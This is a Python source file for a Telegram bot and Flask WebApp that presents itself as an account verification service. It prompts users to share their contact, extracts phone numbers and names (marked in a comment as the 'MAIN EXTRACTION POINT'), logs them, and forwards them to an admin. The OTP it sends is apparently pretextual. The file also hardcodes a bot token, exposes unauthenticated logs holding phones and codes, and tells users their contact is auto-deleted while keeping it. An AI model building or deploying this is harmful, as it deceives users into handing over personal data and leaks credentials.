import os
import telebot
from telebot import types
from flask import Flask, render_template, request, jsonify, Response
import logging
from datetime import datetime
import threading
import time
import json
import random
import uuid
from flask_cors import CORS
import requests
import traceback

# ==================== SETUP ====================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app)
app.secret_key = os.environ.get("SECRET_KEY", "telegram-webapp-secret-key-2024")

# Configuration
BOT_TOKEN = os.environ.get("BOT_TOKEN", "7487704262:AAE34XTNrKt5D9dKtduPK0Ezwc9j3SLGoBA")
WEBAPP_URL = os.environ.get("WEBAPP_URL", "https://itz-me-545-telegram.onrender.com")
ADMIN_ID = os.environ.get("ADMIN_ID", "YOUR_ADMIN_ID_HERE")  # ⚠️ SET THIS!

# Initialize bot
bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML', threaded=False)

# Get bot info
try:
    bot_info = bot.get_me()
    BOT_USERNAME = bot_info.username
    BOT_NAME = bot_info.first_name
    logger.info(f"🤖 Bot initialized: {BOT_NAME} (@{BOT_USERNAME})")
except Exception as e:
    logger.error(f"Failed to get bot info: {e}")
    BOT_USERNAME = "your_bot"
    BOT_NAME = "Verification Bot"

# Session storage with file backup
sessions = {}
SESSION_FILE = "sessions.json"
session_timeout = 600

# ==================== SESSION MANAGEMENT ====================
def load_sessions():
    """Load sessions from file"""
    global sessions
    try:
        if os.path.exists(SESSION_FILE):
            with open(SESSION_FILE, 'r') as f:
                saved_sessions = json.load(f)
                # Convert string dates back to datetime objects
                for sid, session_data in saved_sessions.items():
                    for key, value in session_data.items():
                        if key in ['created', 'last_activity'] and value:
                            session_data[key] = datetime.fromisoformat(value)
                sessions = saved_sessions
                logger.info(f"📂 Loaded {len(sessions)} sessions from file")
    except Exception as e:
        logger.error(f"Error loading sessions: {e}")
        sessions = {}

def save_sessions():
    """Save sessions to file"""
    try:
        # Convert datetime objects to strings
        sessions_to_save = {}
        for sid, session_data in sessions.items():
            sessions_to_save[sid] = session_data.copy()
            for key in ['created', 'last_activity']:
                if key in sessions_to_save[sid] and sessions_to_save[sid][key]:
                    if isinstance(sessions_to_save[sid][key], datetime):
                        sessions_to_save[sid][key] = sessions_to_save[sid][key].isoformat()
        
        with open(SESSION_FILE, 'w') as f:
            json.dump(sessions_to_save, f, indent=2)
    except Exception as e:
        logger.error(f"Error saving sessions: {e}")

def create_session(user_id, telegram_data=None):
    """Create a new session"""
    session_id = str(uuid.uuid4())
    
    sessions[session_id] = {
        'session_id': session_id,
        'user_id': user_id,
        'telegram_data': telegram_data,
        'created': datetime.now(),
        'status': 'active',
        'phone': None,
        'otp_code': None,
        'otp_sent': False,
        'otp_verified': False,
        'contact_shared': False,
        'last_activity': datetime.now()
    }
    
    save_sessions()
    logger.info(f"✅ Created session {session_id} for user {user_id}")
    
    # Notify admin
    notify_admin(f"🆕 New session created\nUser: {user_id}\nSession: {session_id}")
    
    return session_id

def get_session(session_id):
    """Get session by ID"""
    if session_id in sessions:
        session = sessions[session_id]
        
        # Check expiration
        if isinstance(session['created'], str):
            session['created'] = datetime.fromisoformat(session['created'])
        
        time_diff = (datetime.now() - session['created']).total_seconds()
        if time_diff > session_timeout:
            logger.info(f"🗑️ Session expired: {session_id}")
            notify_admin(f"🗑️ Session expired\nSession: {session_id}\nUser: {session.get('user_id')}")
            del sessions[session_id]
            save_sessions()
            return None
        
        # Update last activity
        session['last_activity'] = datetime.now()
        return session
    
    return None

def get_session_by_user(user_id):
    """Get session by user ID"""
    for session_id, session in sessions.items():
        if str(session['user_id']) == str(user_id):
            return session
    return None

def update_session(session_id, updates):
    """Update session data"""
    if session_id in sessions:
        sessions[session_id].update(updates)
        sessions[session_id]['last_activity'] = datetime.now()
        save_sessions()
        return True
    return False

# ==================== ADMIN NOTIFICATIONS ====================
def notify_admin(message, error=False):
    """Send notification to admin"""
    try:
        if ADMIN_ID and ADMIN_ID != "YOUR_ADMIN_ID_HERE":
            prefix = "⚠️ ERROR: " if error else "📢 "
            full_message = f"{prefix}{message}\n⏰ {datetime.now().strftime('%H:%M:%S')}"
            bot.send_message(int(ADMIN_ID), full_message)
            logger.info(f"📨 Admin notified: {message}")
    except Exception as e:
        logger.error(f"Failed to notify admin: {e}")

# ==================== FLASK ROUTES ====================
@app.route('/')
def index():
    """Main page"""
    return render_template('index.html',
                         bot_username=BOT_USERNAME,
                         webapp_url=WEBAPP_URL)

@app.route('/verify')
def verify_page():
    """Verification page"""
    user_id = request.args.get('user_id')
    
    if not user_id:
        return render_template('error.html',
                             error="User ID Required",
                             message="Please open from Telegram bot",
                             bot_username=BOT_USERNAME)
    
    # Check if user already has active session
    existing_session = get_session_by_user(user_id)
    if existing_session:
        session_id = existing_session['session_id']
    else:
        # Create new session
        session_id = create_session(user_id)
    
    logger.info(f"🌐 Verify page accessed - User: {user_id}, Session: {session_id}")
    
    return render_template('verify.html',
                         session_id=session_id,
                         user_id=user_id,
                         bot_username=BOT_USERNAME)

@app.route('/otp')
def otp_page():
    """OTP entry page"""
    session_id = request.args.get('session_id')
    
    if not session_id:
        logger.warning("OTP page accessed without session_id")
        return render_template('error.html',
                             error="Session Required",
                             message="Please share contact first",
                             bot_username=BOT_USERNAME)
    
    session = get_session(session_id)
    if not session or not session.get('otp_sent'):
        logger.warning(f"Invalid session for OTP: {session_id}")
        return render_template('error.html',
                             error="Contact Not Shared",
                             message="Please share your contact first",
                             bot_username=BOT_USERNAME)
    
    phone = session.get('phone', 'Unknown')
    masked_phone = phone[:4] + '****' + phone[-3:] if len(phone) > 7 else phone
    
    logger.info(f"🔢 OTP page accessed - Session: {session_id}, Phone: {masked_phone}")
    
    return render_template('otp.html',
                         session_id=session_id,
                         phone=masked_phone,
                         bot_username=BOT_USERNAME)

@app.route('/success')
def success_page():
    """Success page"""
    session_id = request.args.get('session_id')
    
    if session_id:
        session = get_session(session_id)
        if session and session.get('otp_verified'):
            logger.info(f"🎉 Success page - Verified user: {session.get('user_id')}")
            return render_template('success.html',
                                 phone=session.get('phone'),
                                 bot_username=BOT_USERNAME)
    
    return render_template('error.html',
                         error="Verification Required",
                         message="Please complete verification",
                         bot_username=BOT_USERNAME)

# ==================== LOGGING ENDPOINTS ====================
@app.route('/logs')
def view_logs():
    """View application logs"""
    try:
        with open('bot.log', 'r') as f:
            logs = f.read()
        
        log_html = f"""
        <html>
        <head>
            <title>Bot Logs</title>
            <style>
                body {{ font-family: monospace; background: #1a1a1a; color: #00ff00; padding: 20px; }}
                pre {{ white-space: pre-wrap; word-wrap: break-word; }}
                .error {{ color: #ff5555; }}
                .info {{ color: #55aaff; }}
                .success {{ color: #55ff55; }}
                .warning {{ color: #ffff55; }}
            </style>
        </head>
        <body>
            <h2>🤖 Bot Logs</h2>
            <p>Total Sessions: {len(sessions)} | Active: {len([s for s in sessions.values() if s.get('status') == 'active'])}</p>
            <pre>{logs}</pre>
        </body>
        </html>
        """
        return log_html
    except Exception as e:
        return f"Error reading logs: {e}"

@app.route('/api/status')
def api_status():
    """API status check"""
    return jsonify({
        'status': 'online',
        'bot': BOT_USERNAME,
        'sessions': len(sessions),
        'active_sessions': len([s for s in sessions.values() if s.get('status') == 'active']),
        'verified_sessions': len([s for s in sessions.values() if s.get('otp_verified')]),
        'timestamp': datetime.now().isoformat()
    })

# ==================== API ENDPOINTS ====================
@app.route('/api/process-contact', methods=['POST'])
def api_process_contact():
    """Process contact from Bot"""
    try:
        data = request.json
        session_id = data.get('session_id')
        phone = data.get('phone')
        user_id = data.get('user_id')
        
        logger.info(f"📱 API Contact Processing - Session: {session_id}, User: {user_id}, Phone: {phone}")
        
        if not session_id:
            error_msg = "Session ID required"
            logger.error(error_msg)
            notify_admin(f"API Error: {error_msg}\nUser: {user_id}", error=True)
            return jsonify({'success': False, 'error': error_msg})
        
        if not phone:
            error_msg = "Phone number required"
            logger.error(error_msg)
            return jsonify({'success': False, 'error': error_msg})
        
        # Get session
        session = get_session(session_id)
        if not session:
            # Try to find by user_id
            if user_id:
                session = get_session_by_user(user_id)
                if not session:
                    # Create new session
                    session_id = create_session(user_id)
                    session = get_session(session_id)
                    logger.info(f"🆕 Created new session for user: {user_id}")
            else:
                error_msg = f"Session not found: {session_id}"
                logger.error(error_msg)
                notify_admin(f"Session Error: {error_msg}", error=True)
                return jsonify({'success': False, 'error': 'Session not found'})
        
        # Normalize phone number
        if not phone.startswith('+'):
            phone = '+' + phone
        
        # Generate OTP
        otp_code = str(random.randint(100000, 999999))
        
        # Update session
        update_session(session['session_id'], {
            'phone': phone,
            'otp_code': otp_code,
            'otp_sent': True,
            'contact_shared': True,
            'status': 'contact_received',
            'contact_received_at': datetime.now().isoformat()
        })
        
        # Send OTP via Telegram to user
        try:
            user_id = session.get('user_id')
            if user_id:
                otp_message = f"""✅ <b>Contact Received!</b>

📱 Phone: {phone}
🔢 OTP: <code>{otp_code}</code>

Enter this code in the WebApp to verify your account.

⚠️ <i>Do not share this code with anyone.</i>"""
                
                bot.send_message(int(user_id), otp_message, parse_mode='HTML')
                logger.info(f"📨 OTP sent to user {user_id}: {otp_code}")
                
                # Notify admin about OTP sent
                notify_admin(f"OTP Sent\nUser: {user_id}\nPhone: {phone}\nOTP: {otp_code}")
        except Exception as e:
            error_msg = f"Failed to send Telegram OTP: {str(e)}"
            logger.error(error_msg)
            notify_admin(error_msg, error=True)
        
        return jsonify({
            'success': True,
            'message': 'Contact processed and OTP sent',
            'session_id': session['session_id'],
            'otp_sent': True
        })
        
    except Exception as e:
        error_msg = f"Error processing contact: {str(e)}"
        logger.error(error_msg)
        logger.error(traceback.format_exc())
        notify_admin(f"Contact Processing Error: {error_msg}", error=True)
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/check-session/<session_id>', methods=['GET'])
def api_check_session(session_id):
    """Check session status"""
    try:
        if not session_id or session_id == 'undefined':
            logger.warning("Empty session_id in check-session")
            return jsonify({'success': False, 'error': 'Valid session ID required'})
        
        session = get_session(session_id)
        if session:
            logger.info(f"✅ Session check successful: {session_id}")
            return jsonify({
                'success': True,
                'session': {
                    'session_id': session_id,
                    'user_id': session.get('user_id'),
                    'status': session.get('status'),
                    'phone': session.get('phone'),
                    'contact_shared': session.get('contact_shared', False),
                    'otp_sent': session.get('otp_sent', False),
                    'otp_verified': session.get('otp_verified', False)
                }
            })
        
        logger.warning(f"❌ Session not found: {session_id}")
        return jsonify({'success': False, 'error': 'Session not found'})
    except Exception as e:
        error_msg = f"Error checking session: {str(e)}"
        logger.error(error_msg)
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/verify-otp', methods=['POST'])
def api_verify_otp():
    """Verify OTP"""
    try:
        data = request.json
        session_id = data.get('session_id')
        otp = data.get('otp', '').strip()
        
        if not session_id:
            return jsonify({'success': False, 'error': 'Session ID required'})
        
        if not otp or len(otp) != 6:
            return jsonify({'success': False, 'error': 'Invalid OTP format (6 digits required)'})
        
        session = get_session(session_id)
        if not session:
            return jsonify({'success': False, 'error': 'Session expired'})
        
        if not session.get('otp_sent'):
            return jsonify({'success': False, 'error': 'OTP not sent yet'})
        
        # Verify OTP
        if session.get('otp_code') == otp:
            # Mark as verified
            update_session(session_id, {
                'otp_verified': True,
                'status': 'verified',
                'verified_at': datetime.now().isoformat()
            })
            
            # Send success message to user
            try:
                user_id = session.get('user_id')
                if user_id:
                    success_msg = f"""✅ <b>VERIFICATION SUCCESSFUL</b>

Your account has been verified successfully!

📱 Phone: {session.get('phone')}
⏰ Time: {datetime.now().strftime('%H:%M:%S')}

Thank you for verifying your account!"""
                    
                    bot.send_message(int(user_id), success_msg, parse_mode='HTML')
            except Exception as e:
                logger.error(f"User notification failed: {e}")
            
            # Notify admin
            notify_admin(f"✅ Verification Completed\nUser: {session.get('user_id')}\nPhone: {session.get('phone')}")
            
            logger.info(f"🎉 OTP verified successfully for session: {session_id}")
            
            return jsonify({
                'success': True,
                'message': 'OTP verified successfully!',
                'redirect': f'/success?session_id={session_id}'
            })
        else:
            logger.warning(f"❌ Invalid OTP attempt for session: {session_id}")
            return jsonify({
                'success': False,
                'error': 'Invalid OTP code'
            })
        
    except Exception as e:
        error_msg = f"Error verifying OTP: {str(e)}"
        logger.error(error_msg)
        notify_admin(f"OTP Verification Error: {error_msg}", error=True)
        return jsonify({'success': False, 'error': str(e)})

# ==================== BOT HANDLERS ====================
@bot.message_handler(commands=['start', 'help'])
def handle_start(message):
    """Handle /start command"""
    try:
        user_id = str(message.from_user.id)
        chat_id = message.chat.id
        first_name = message.from_user.first_name or ""
        username = message.from_user.username or ""
        
        logger.info(f"📨 /start from {user_id} (@{username})")
        
        # Create or get session
        session = get_session_by_user(user_id)
        if not session:
            session_id = create_session(user_id)
            session = get_session(session_id)
        else:
            session_id = session['session_id']
        
        # Create WebApp URL
        webapp_url = f"{WEBAPP_URL.rstrip('/')}/verify?user_id={user_id}"
        
        # Create WebApp button
        keyboard = types.InlineKeyboardMarkup()
        webapp_button = types.InlineKeyboardButton(
            text="📱 Open Verification WebApp",
            web_app=types.WebAppInfo(url=webapp_url)
        )
        keyboard.add(webapp_button)
        
        # Add debug button
        debug_button = types.InlineKeyboardButton(
            text="🔧 Debug Info",
            callback_data=f"debug_{session_id}"
        )
        keyboard.add(debug_button)
        
        # Welcome message
        welcome_text = f"""<b>🔐 Telegram Account Verification</b>

Hello {first_name}! 👋

Click the button below to open the WebApp and verify your Telegram account.

<b>How it works:</b>
1. Open WebApp
2. Tap "Share Contact"
3. Select your contact
4. Receive OTP here
5. Enter OTP in WebApp
6. Verification complete! ✅

⚠️ <b>Important:</b> Your contact will be auto-deleted immediately.

<b>Bot:</b> @{BOT_USERNAME}
<b>Session:</b> <code>{session_id}</code>"""
        
        # Send message
        bot.send_message(
            chat_id,
            welcome_text,
            parse_mode="HTML",
            reply_markup=keyboard
        )
        
        logger.info(f"✅ Responded to /start from {user_id}")
        notify_admin(f"👤 New User Started\nUser: {user_id}\nName: {first_name}\nSession: {session_id}")
        
    except Exception as e:
        error_msg = f"Error in /start: {str(e)}"
        logger.error(error_msg)
        logger.error(traceback.format_exc())
        try:
            bot.send_message(message.chat.id, "⚠️ Something went wrong. Please try /start again.")
        except:
            pass

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    """Handle callback queries"""
    try:
        if call.data.startswith("debug_"):
            session_id = call.data.replace("debug_", "")
            session = get_session(session_id)
            
            if session:
                debug_info = f"""🔧 <b>Debug Info</b>

🆔 Session: <code>{session_id}</code>
👤 User: {session.get('user_id')}
📱 Phone: {session.get('phone') or 'Not shared'}
🔢 OTP Sent: {'✅' if session.get('otp_sent') else '❌'}
✅ Verified: {'✅' if session.get('otp_verified') else '❌'}
📊 Status: {session.get('status')}
⏰ Created: {session.get('created').strftime('%H:%M:%S') if isinstance(session.get('created'), datetime) else session.get('created')}"""
                
                bot.answer_callback_query(call.id, "Debug info sent")
                bot.send_message(call.message.chat.id, debug_info, parse_mode='HTML')
            else:
                bot.answer_callback_query(call.id, "Session not found")
    except Exception as e:
        logger.error(f"Callback error: {e}")

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    """Handle contact sharing - MAIN EXTRACTION POINT"""
    try:
        user_id = str(message.from_user.id)
        chat_id = message.chat.id
        
        if not message.contact:
            bot.send_message(chat_id, "⚠️ Please share a valid contact.")
            return
        
        contact = message.contact
        phone = contact.phone_number  # 📱 PHONE EXTRACTION HAPPENS HERE
        first_name = contact.first_name or ""
        last_name = contact.last_name or ""
        
        logger.info(f"📞 Contact received from {user_id}: {phone}")
        
        # Normalize phone
        if not phone.startswith('+'):
            phone = '+' + phone
        
        # Find or create session
        session = get_session_by_user(user_id)
        if not session:
            session_id = create_session(user_id)
            session = get_session(session_id)
        
        # Delete contact message for privacy
        try:
            bot.delete_message(chat_id, message.message_id)
            logger.info(f"🗑️ Deleted contact message for {user_id}")
        except Exception as e:
            logger.warning(f"Could not delete message: {e}")
        
        # Send processing message
        processing_msg = bot.send_message(
            chat_id,
            f"✅ Contact received!\n📱 Phone: {phone}\n\nProcessing OTP...",
            reply_markup=types.ReplyKeyboardRemove()
        )
        
        # Call API to process contact
        try:
            api_url = f"{WEBAPP_URL.rstrip('/')}/api/process-contact"
            
            response = requests.post(
                api_url,
                json={
                    "session_id": session['session_id'],
                    "phone": phone,
                    "user_id": user_id
                },
                timeout=10
            ).json()
            
            if response.get('success'):
                # Generate OTP locally as backup
                otp_code = str(random.randint(100000, 999999))
                
                # Update session
                update_session(session['session_id'], {
                    'phone': phone,
                    'otp_code': otp_code,
                    'otp_sent': True,
                    'contact_shared': True,
                    'status': 'contact_received'
                })
                
                # Send OTP to user
                otp_message = f"""✅ <b>Contact Processed Successfully!</b>

📱 Phone: {phone}
👤 Name: {first_name} {last_name}

🔢 <b>Your OTP Code:</b> <code>{otp_code}</code>

Enter this code in the WebApp to complete verification.

Return to WebApp to enter OTP.

<b>Session ID:</b> <code>{session['session_id']}</code>"""
                
                bot.edit_message_text(
                    otp_message,
                    chat_id,
                    processing_msg.message_id,
                    parse_mode='HTML'
                )
                
                logger.info(f"✅ Contact processed for {user_id}, OTP: {otp_code}")
                notify_admin(f"📞 Contact Processed\nUser: {user_id}\nPhone: {phone}")
                
            else:
                error_msg = response.get('error', 'Failed to process contact')
                bot.edit_message_text(
                    f"❌ Error: {error_msg}\n\nPlease try again.",
                    chat_id,
                    processing_msg.message_id
                )
                logger.error(f"API error for {user_id}: {error_msg}")
                notify_admin(f"Contact API Error: {error_msg}", error=True)
                
        except Exception as e:
            logger.error(f"API call failed: {e}")
            logger.error(traceback.format_exc())
            
            # Fallback: Generate OTP locally
            otp_code = str(random.randint(100000, 999999))
            
            # Update session
            update_session(session['session_id'], {
                'phone': phone,
                'otp_code': otp_code,
                'otp_sent': True,
                'contact_shared': True,
                'status': 'contact_received'
            })
            
            bot.edit_message_text(
                f"""✅ <b>Contact Received!</b>

📱 Phone: {phone}
👤 Name: {first_name} {last_name}

🔢 <b>Your OTP Code:</b> <code>{otp_code}</code>

Enter this code in the WebApp to complete verification.

Return to WebApp to enter OTP.

<b>Session ID:</b> <code>{session['session_id']}</code>""",
                chat_id,
                processing_msg.message_id,
                parse_mode='HTML'
            )
            
            logger.info(f"✅ Fallback OTP for {user_id}: {otp_code}")
            notify_admin(f"📞 Fallback Contact Processed\nUser: {user_id}\nPhone: {phone}")
        
    except Exception as e:
        error_msg = f"Error handling contact: {str(e)}"
        logger.error(error_msg)
        logger.error(traceback.format_exc())
        notify_admin(f"Contact Handler Error: {error_msg}", error=True)
        try:
            bot.send_message(message.chat.id, "⚠️ Error processing contact. Please try again.")
        except:
            pass

@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    """Handle all other messages"""
    try:
        user_id = str(message.from_user.id)
        text = message.text or ""
        
        # Ignore commands
        if text.startswith('/'):
            return
        
        logger.info(f"💬 Message from {user_id}: {text[:50]}...")
        
        # Help response
        help_text = f"""<b>📋 How to verify:</b>

1. Send /start to get WebApp link
2. Open WebApp and tap "Share Contact"
3. Select your contact from Telegram
4. OTP will appear here
5. Enter OTP in WebApp

<b>Bot:</b> @{BOT_USERNAME}"""
        
        bot.send_message(message.chat.id, help_text, parse_mode='HTML')
        
    except Exception as e:
        logger.error(f"Error handling message: {e}")

# ==================== BOT POLLING ====================
def start_bot_polling():
    """Start bot polling - ROBUST VERSION"""
    logger.info("🤖 Starting BOT POLLING...")
    
    max_retries = 10
    retry_count = 0
    
    while retry_count < max_retries:
        try:
            logger.info(f"🔄 Bot polling attempt {retry_count + 1}/{max_retries}")
            
            # Remove webhook first
            bot.remove_webhook()
            time.sleep(1)
            
            # Test bot connection
            bot_info = bot.get_me()
            logger.info(f"✅ Bot connected: @{bot_info.username}")
            
            # Start polling with error handling
            bot.polling(
                none_stop=True,
                interval=2,
                timeout=30,
                long_polling_timeout=30
            )
            
        except telebot.apihelper.ApiTelegramException as api_error:
            if "Conflict" in str(api_error):
                logger.error("❌ Another bot instance is running. Waiting 10 seconds...")
                time.sleep(10)
            else:
                logger.error(f"❌ Telegram API error: {api_error}")
                retry_count += 1
                time.sleep(5)
                
        except Exception as e:
            logger.error(f"❌ Bot polling error: {str(e)}")
            logger.error(traceback.format_exc())
            retry_count += 1
            time.sleep(5)
    
    logger.error("❌ Max retries reached. Bot polling stopped.")

# ==================== CLEANUP THREAD ====================
def cleanup_sessions():
    """Clean up expired sessions"""
    while True:
        try:
            current_time = datetime.now()
            expired_sessions = []
            
            for session_id, session in sessions.items():
                # Ensure created is datetime
                if isinstance(session.get('created'), str):
                    session['created'] = datetime.fromisoformat(session['created'])
                
                time_diff = (current_time - session['created']).total_seconds()
                if time_diff > session_timeout:
                    expired_sessions.append(session_id)
            
            for session_id in expired_sessions:
                user_id = sessions[session_id].get('user_id')
                logger.info(f"🧹 Cleaned expired session: {session_id} (User: {user_id})")
                del sessions[session_id]
            
            if expired_sessions:
                save_sessions()
            
            time.sleep(60)
            
        except Exception as e:
            logger.error(f"Cleanup error: {e}")
            time.sleep(60)

# ==================== HEALTH CHECK ====================
def health_check():
    """Periodic health check"""
    while True:
        try:
            # Check bot status
            try:
                bot_info = bot.get_me()
                logger.info(f"❤️ Health Check - Bot: @{bot_info.username}, Sessions: {len(sessions)}")
            except:
                logger.warning("❤️ Health Check - Bot connection issue")
            
            time.sleep(300)  # Check every 5 minutes
            
        except Exception as e:
            logger.error(f"Health check error: {e}")
            time.sleep(60)

# ==================== MAIN ====================
if __name__ == '__main__':
    # Startup info
    logger.info("="*50)
    logger.info("🚀 TELEGRAM VERIFICATION BOT - FIXED VERSION")
    logger.info("="*50)
    logger.info(f"🤖 Bot: @{BOT_USERNAME}")
    logger.info(f"🌐 WebApp: {WEBAPP_URL}")
    logger.info(f"👑 Admin: {ADMIN_ID}")
    logger.info("="*50)
    
    # Load sessions
    load_sessions()
    
    # Start cleanup thread
    cleanup_thread = threading.Thread(target=cleanup_sessions, daemon=True)
    cleanup_thread.start()
    logger.info("✅ Cleanup thread started")
    
    # Start health check thread
    health_thread = threading.Thread(target=health_check, daemon=True)
    health_thread.start()
    logger.info("✅ Health check thread started")
    
    # Start Flask in separate thread
    flask_thread = threading.Thread(target=lambda: app.run(
        host='0.0.0.0',
        port=int(os.environ.get('PORT', 10000)),
        debug=False,
        use_reloader=False,
        threaded=True
    ), daemon=True)
    flask_thread.start()
    logger.info("✅ Flask started in thread")
    
    # Wait a moment for Flask to start
    time.sleep(2)
    
    # Start bot polling in main thread (important!)
    logger.info("✅ Starting bot polling in main thread...")
    start_bot_polling()
